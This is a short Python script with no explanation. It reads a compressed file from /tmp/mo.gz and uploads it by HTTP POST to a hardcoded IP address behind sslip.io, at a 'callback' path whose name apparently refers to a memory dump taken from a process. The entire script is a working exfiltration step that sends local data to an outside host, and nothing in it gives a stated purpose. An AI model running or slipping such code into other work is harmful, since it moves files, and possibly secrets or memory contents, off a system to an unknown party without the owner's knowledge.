#!/usr/bin/env python3
import pathlib, urllib.request
p=pathlib.Path('/tmp/mo.gz')
d=p.read_bytes()
r=urllib.request.urlopen(urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-pid1-static-memory-basic2-20261106',data=d,method='POST',headers={'Content-Type':'application/gzip'}),timeout=60)
print('status',r.status,'bytes',len(d))
